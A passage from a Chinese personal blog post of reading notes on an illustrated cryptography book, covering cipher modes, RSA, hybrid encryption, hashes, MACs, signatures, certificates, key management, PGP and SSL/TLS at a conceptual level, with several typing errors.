<p>CFB 模式，前一个密文分组会被送回到密码算法的输入端，即初始化向量通过加密算法与明文分组进行异或运算，得到密文分组。</p>
<p>OFB 模式，密码算法的输出会反馈到密码算法的输入中，通过将明文分组和密码算法的输出进行异或运算来产生密文分组。</p>
<p>CTR 模式，通过将逐次累加的计数器进行加密来生成密钥流的流密码。每个分组对应一个逐次累加的计数器，并通过对计数器进行加密来生成密钥流，也就是说，最终的密钥分组时通过将计数器加密得到的比特序列与明文分组进行异或运算得到的。</p>
<h3 id="公钥密码"><a href="#公钥密码" class="headerlink" title="公钥密码"></a>公钥密码</h3><p>公钥密码是密码学历史上最伟大的发明，是数学史上最伟大的发现。</p>
<p>公钥密码解决的问题：密钥发送。</p>
<p>在公钥密码中，密钥氛围加密密钥和解密密钥两种，发送者用加密密钥对消息进行加密，接收者用解密密钥对密文进行解密。</p>
<p>注意：</p>
<ol>
<li>发送者只需要加密密钥</li>
<li>接收者值需要解密密钥</li>
<li>解密密钥步可以被窃听者窃取</li>
<li>加密密钥被窃听者获取也没问题</li>
</ol>
<p>RSA 是一种公钥密码算法，被用于公钥密码和数字签名。<br>加密公式：对代表明文的数字的 E 次方球 mod N 的结果，结果就是密文。其中 E 和 N 是 RSA 加密的密钥，也就是E 和 N 的组合就是公钥。</p>
<p>解密公式：对代表密文的数字的 D 次方球 mod N 就可以得到明文，其中 N 与加密算法中的N 是相同的。</p>
<p>生成密钥对流程：</p>
<ol>
<li>求 N<ol>
<li>准备两个很大的质数，假设为 p 和 q，并将其相乘，结果为 N</li>
</ol>
</li>
<li>求 L<ol>
<li>L 是 p-1 和 q-1 的最小公倍数</li>
</ol>
</li>
<li>求 E<ol>
<li>E 是一个比 1 大，比 L 小的数，E 和 L 的最大公约数必须为 1</li>
</ol>
</li>
<li>求 D<ol>
<li>1 &lt; D &lt; L</li>
<li>E * D mod L = 1</li>
</ol>
</li>
</ol>
<h3 id="混合密码系统"><a href="#混合密码系统" class="headerlink" title="混合密码系统"></a>混合密码系统</h3><p>公钥密码劣势：</p>
<ol>
<li>公钥密钥处理速度远远低于对称密码</li>
<li>公钥密码难以抵御中间人攻击</li>
</ol>
<p>混合密码主要解决上述问题 1。有以下机制：</p>
<ol>
<li>用对称密码加密消息</li>
<li>通过伪随机数生成器生成对称密码加密中使用的会话密钥</li>
<li>用公钥密码加密会话密钥</li>
<li>从混合密码系统外部赋予公钥密码加密时使用的密钥</li>
</ol>
<img src="/2019/09/14/《图解密码技术》读书笔记/2.png" title="img2">
<img src="/2019/09/14/《图解密码技术》读书笔记/3.png" title="img3">
<h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><h3 id="单向散列函数"><a href="#单向散列函数" class="headerlink" title="单向散列函数"></a>单向散列函数</h3><p>单向散列函数有一个输入和一个输出，输入称为消息，输出称为散列值，函数可以根据消息的内容计算出散列值，可以根据散列值来检查消息的完整性。</p>
<p>特性：</p>
<ol>
<li>根据任意长度的消息计算出固定长度的散列值</li>
<li>能够快速计算出散列值</li>
<li>消息不同散列值也不同</li>
<li>具备单向性</li>
</ol>
<p>实际应用：</p>
<ol>
<li>检测软件是否被篡改</li>
<li>基于口令的加密</li>
<li>消息认证码</li>
<li>数字签名</li>
<li>伪随机数生成器</li>
<li>一次性口令</li>
</ol>
<p>具体例子：</p>
<ol>
<li>MD4，MD5</li>
<li>SHA-1，SHA-256，SHA-384，SHA-512</li>
<li>RIPEMD-160</li>
<li>AHS，SHA-3</li>
</ol>
<p>单向散列函数能够辨别出篡改，但是无法辨别出伪装。当我们想要确定文件的所有者时谁，需要进行认证。用于认证的技术包括消息验证码和数字签名。消息认证码能够想通信对象保证消息没有被篡改，而数字签名不仅能够向通信对象保证消息没有被篡改，还能够向所有第三方作出这样的保证。</p>
<h3 id="消息认证码"><a href="#消息认证码" class="headerlink" title="消息认证码"></a>消息认证码</h3><p>在消息传递时，需要关注完整性和认证两个性质。</p>
<p>消息认证码是一种确认完整性并进行认证的技术，简称 MAC。消息认证码的输入包括任意长度的消息和一个发送者与接收者之间共享的密钥，它可以输出固定长度的数据，这个数据称为 MAC 值。简单理解：消息认证码是一种与密钥相关联的单向散列函数。</p>
<p>无法解决的问题：</p>
<ol>
<li>对第三方证明</li>
<li>防止否认</li>
</ol>
<h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>为什么要使用数字签名：</p>
<ul>
<li>消息认证码的局限性</li>
<li>消息认证码无法防止否认，发送者与接收者共享同一个密钥，对第三方来说，无法确认消息是谁发送的</li>
</ul>
<p>签名的生成和验证</p>
<ul>
<li>生成消息签名的行为<ul>
<li>由消息的发送者完成，意味着“发送者认可该消息的内容”</li>
<li>发送者使用签名密钥生成消息的签名</li>
<li>签名密钥只能由签名人持有</li>
</ul>
</li>
<li>验证消息签名的行为<ul>
<li>一般由消息的接收者完成，也可以由需要验证消息的第三方来完成</li>
<li>接收者使用验证密钥进行密钥的验证</li>
<li>验证密钥无法生成签名</li>
<li>验证密钥可以是任何由需要验证签名的人持有</li>
</ul>
</li>
</ul>
<p>公钥密钥使用公钥加密，使用私钥解密；</p>
<p>数字签名使用私钥签发，使用公钥验证。</p>
<img src="/2019/09/14/《图解密码技术》读书笔记/4.png" title="img4">
<p>缺点：</p>
<ul>
<li>无法判断公钥是否属于签发者</li>
</ul>
<h3 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h3><p>公钥证书与驾照类似，记录着姓名、组织、邮箱地址等个人信息以及属于此人的公钥，并由认证机构施加数字签名，公钥证书简称证书。</p>
<p>典型使用流程：</p>
<ol>
<li>接收者生成密钥对</li>
<li>接收者在认证结构 Trent 注册自己的公钥</li>
<li>认证结构 Trent 用自己的私钥对 Bob 的公钥施加数字签名并生成证书</li>
<li>发送者得到带有认证机构 Trent 的数字签名的接收者的公钥（证书）</li>
<li>发送者使用认证机构 Trent 的公钥验证数字签名，确认接收者公钥的合法性</li>
<li>发送者使用接收者的公钥加密消息并发送到接收者</li>
<li>接收者使用自己的私钥解密密文得到发送者的消息</li>
</ol>
<p>公钥基础设施是为了能够更有效的运用公钥而指定的一系列规范和规格的总称，简称 PKI。</p>
<p>组成要素：</p>
<ol>
<li>用户—使用 PKI 的人</li>
<li>认证机构—颁发证书的人</li>
<li>仓库—保存证书的数据库</li>
</ol>
<h2 id="密钥、随机数与应用技术"><a href="#密钥、随机数与应用技术" class="headerlink" title="密钥、随机数与应用技术"></a>密钥、随机数与应用技术</h2><h3 id="密钥"><a href="#密钥" class="headerlink" title="密钥"></a>密钥</h3><p>密钥就是一个巨大的数字，数字本身不重要，重要的是密钥空间的大小，空间越大，暴力破解就越困难，空间的大小是由密钥长度决定的。</p>
<p>密钥与明文是等价的，明文的价值就是密钥的价值。</p>
<p>密钥的用途：</p>
<ul>
<li>在对称密码中，由于发送者和接收者之间需要共享密钥，因此对称密钥又称为共享密钥密码。</li>
<li>在公钥密码中，加密和解密使用的是不同的密钥，加密的是公钥，解密的是私钥，私钥也称为私密密钥，公钥与私钥也称为密钥对。</li>
<li>对称密码和公钥密钥的密钥都是用于确保机密性的密钥，相对的，消息认证码和数字签名所使用的密钥，则是用于认证的密钥。</li>
</ul>
<p>密钥的管理：</p>
<ul>
<li>生成密钥<ul>
<li>用随机数生成密钥</li>
<li>用口令生成密钥</li>
</ul>
</li>
<li>配送密钥<ul>
<li>事先共享密钥</li>
<li>使用公钥密码</li>
<li>Diffie-Hellman 密钥交换</li>
</ul>
</li>
<li>更新密钥<ul>
<li>用当前密钥的散列值作为下一个密钥</li>
</ul>
</li>
<li>保存密钥<ul>
<li>人类无法记住密钥</li>
<li>保存在保险柜等安全的地方</li>
<li>将密钥加密后保存</li>
<li>减少需要保管的密钥数量</li>
</ul>
</li>
<li>作废密钥<ul>
<li>删除密钥的同时，需要将对应的加密后文件一同删除</li>
</ul>
</li>
</ul>
<p>如何生成安全的口令</p>
<ul>
<li>使用只有自己才能知道的信息<ul>
<li>不要使用对自己重要的事物的名字</li>
<li>不要使用关于自己的信息</li>
<li>不要使用别人见过的信息</li>
</ul>
</li>
<li>将多个不同的口令分开使用</li>
<li>有效利用笔记</li>
<li>理解口令的局限性</li>
</ul>
<h3 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h3><p>为了不让攻击者看穿而使用随机数。</p>
<p>应用场景：</p>
<ul>
<li>生成密钥<ul>
<li>用于对称密码和消息认证码</li>
</ul>
</li>
<li>生成密钥对<ul>
<li>用于公钥密码和数字签名</li>
</ul>
</li>
<li>生成初始化向量<ul>
<li>用于分组密码的 CBC、CFB、OFB 模式</li>
</ul>
</li>
<li>生成 nonce<ul>
<li>用于防御重放攻击以及分组密码的 CTR 模式等</li>
</ul>
</li>
<li>生成盐<ul>
<li>用于基于口令的密码等</li>
</ul>
</li>
</ul>
<p>随机数的性质：</p>
<ul>
<li>随机性—不存在统计学偏差，完全杂乱的数列</li>
<li>不可预测行—不能从过去的数列推测出下一个出现的数</li>
<li>不可重现性—除非将数列本身保存下来，否则不能重现相同的数列</li>
</ul>
<h3 id="PGP"><a href="#PGP" class="headerlink" title="PGP"></a>PGP</h3><p>PGP（Pretty Good Privary）是一款密码软件，支持多平台。</p>
<p>功能列表：</p>
<ol>
<li>对称密码</li>
<li>公钥密码</li>
<li>数字签名</li>
<li>单向散列函数</li>
<li>证书</li>
<li>压缩</li>
<li>文本数据</li>
<li>大文件的拆分和拼合</li>
<li>钥匙串管理</li>
</ol>
<p>加密流程：</p>
<img src="/2019/09/14/《图解密码技术》读书笔记/5.png" title="img5">
<p>解密流程：</p>
<img src="/2019/09/14/《图解密码技术》读书笔记/6.png" title="img6">
<h3 id="SSL-TLS"><a href="#SSL-TLS" class="headerlink" title="SSL/TLS"></a>SSL/TLS</h3><p>SSL(Secure Socket Layer)<br>TLS(Transport Layer Security)</p>
<p>当 Web 浏览器发送请求时，请求的数据会作为客户端请求发送给服务器，如果通信内容被窃听者所窃取，那么窃听者就会得到请求数据。可以使用 SSL/TLS 作为对通信进行加密的协议，然后再次智商承载 HTTP。通过将两种协议进行叠加，我们就可以对HTTP 的通信进行加密，防止窃听。通过 SSL/TLS 进行通信时，URL 以 https 开头。</p>
<p>解决问题：</p>
<ul>
<li>机密性问题<ul>
<li>解决方式：对称密码、伪随机数生成器、公钥密码</li>
</ul>
</li>
<li>完整性问题<ul>
<li>解决方式：消息认证码</li>
</ul>
</li>
<li>认证问题<ul>
<li>解决方式：数字签名</li>
</ul>
</li>
</ul>
<p>SSL 与 TLS 区别：<br>SSL 是 1994年由王晶公司设计的一种协议，于1995年发布了3.0 版本。<br>TLS 设市 IETF 基于 SSL 3.0 版本的基础上设计的协议，在 1999年发布了 TLS 1.0 版本，实际上相当于 SSL 3.1。2006 年发布 TLS 1.1 版本，在对称密码算法中加入了 AES 支持。</p>
<p>SSL/TLS 使用到的密码技术：</p>
<ul>
<li>公钥密码<ul>
<li>加密预备主密码</li>
</ul>
</li>
<li>单向散列函数<ul>
<li>构成伪随机数生成器</li>
</ul>
</li>
<li>数字签名<ul>
<li>验证服务器和客户端的证书</li>
</ul>
</li>
<li>伪随机数生成器<ul>
<li>生成预备主密码</li>
<li>根据主密码生成密钥</li>
<li>生成初始化向量</li>
</ul>
</li>
<li>对称密码<ul>
<li>确保片段的机密性</li>
</ul>
</li>
<li>消息认证码<ul>
<li>确保片段的完整性并进行认证</li>
</ul>
</li>
</ul>
<h3 id="密码技术与现实社会"><a href="#密码技术与现实社会" class="headerlink" title="密码技术与现实社会"></a>密码技术与现实社会</h3><p>密码的作用是为了确保机密性，将明文转换为密文。转换之后，密文不需要保护了，需要保护的是加密时使用的密钥。通过保护较短的密钥来保护较长的明文，称为机密性的压缩。</p>
<p>单向散列函数时用于确认完整性的，不必检查较长的明文的完整性，只要检查散列值就能确认，这种做法称为完整性的压缩。</p>
<p>消息认证码和数字签名都是用于认证的技术，通过较短的认证富豪来对较长的消息进行认证，称为认证的压缩。</p>
<p>只有完美的密码，没有完美的人。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/yiran.png" alt="yiran">
            
              <p class="site-author-name" itemprop="name">yiran</p>
              <p class="site-description motion-element" itemprop="description">Normal is boring</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">103</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">27</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/zdyxry" target="_blank" title="GitHub">
                      GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:zdyxry@gmail.com" target="_blank" title="E-Mail">
                      E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://twitter.com/zhouyiran1994" target="_blank" title="Twitter">
                      Twitter</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.douban.com/people/62229099/" target="_blank" title="Douban">
                      Douban</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://winkidney.com/" title="amao" target="_blank">amao</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://jiajunhuang.com/" title="jiajun" target="_blank">jiajun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://liuliqiang.info/" title="liqiang" target="_blank">liqiang</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yiran</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  

    
      <script id="dsq-count-scr" src="https://zdyxry.disqus.com/count.js" async></script>
    

    

  

















  





  

  

  

  
  

  

  

  

</body>
</html>
